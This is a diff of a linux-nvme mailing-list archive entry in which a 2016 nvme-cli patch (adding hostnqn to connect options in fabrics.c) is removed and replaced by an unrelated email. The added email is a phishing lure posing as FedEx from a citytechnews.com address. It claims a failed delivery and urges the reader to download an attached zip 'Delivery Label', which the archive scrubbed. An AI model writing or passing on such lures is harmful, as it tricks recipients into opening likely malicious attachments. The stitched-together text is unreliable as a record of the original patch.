@@ -1,39 +1,21 @@
-From: james_p_freyensee@linux.intel.com (Jay Freyensee)
-Date: Wed, 19 Oct 2016 12:43:07 -0700
-Subject: [PATCH 3/3] nvme-cli: fix nvme-connect-all using hostnqn
-In-Reply-To: <1476906187-29183-1-git-send-email-james_p_freyensee@linux.intel.com>
-References: <1476906187-29183-1-git-send-email-james_p_freyensee@linux.intel.com>
-Message-ID: <1476906187-29183-4-git-send-email-james_p_freyensee@linux.intel.com>
+From: anthony.mcallister@citytechnews.com (FedEx SmartPost)
+Date: Wed, 19 Oct 2016 19:41:36 +0000
+Subject: Shipment delivery problem #000710932
+Message-ID: <2dcff2d9e70636c4a60de7797c8a4185@citytechnews.com>
 
-The example in the man pages:
+Dear Customer,
 
-nvme connect-all --transport=rdma --traddr=192.168.1.3 \
---hostnqn=host1-rogue-nqn
+Courier was unable to deliver the parcel to you.
+Please, download Delivery Label attached to this email.
 
-fails because nvme-cli fails to actually use hostnqn upon
-connect.  This patch fixes that.
+Thank you for choosing FedEx,
+Anthony Mcallister,
+Sr. Delivery Manager.
 
-Signed-off-by: Jay Freyensee <james_p_freyensee at linux.intel.com>
----
- fabrics.c | 6 ++++++
- 1 file changed, 6 insertions(+)
-
-diff --git a/fabrics.c b/fabrics.c
-index 51e424e..801fe4f 100644
---- a/fabrics.c
-+++ b/fabrics.c
-@@ -540,6 +540,12 @@ static int connect_ctrl(struct nvmf_disc_rsp_page_entry *e)
- 		return -EINVAL;
- 	p += len;
- 
-+	if (cfg.hostnqn)
-+	len = sprintf(p, ",hostnqn=%s", cfg.hostnqn);
-+	if (len < 0)
-+		return -EINVAL;
-+	p += len;
-+
- 	switch (e->trtype) {
- 	case NVMF_TRTYPE_LOOP: /* loop */
- 		len = sprintf(p, ",transport=loop");
--- 
-2.5.5
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: Delivery_Notification_000710932.zip
+Type: application/zip
+Size: 7138 bytes
+Desc: not available
+URL: <http://lists.infradead.org/pipermail/linux-nvme/attachments/20161019/46e5905e/attachment-0001.zip>
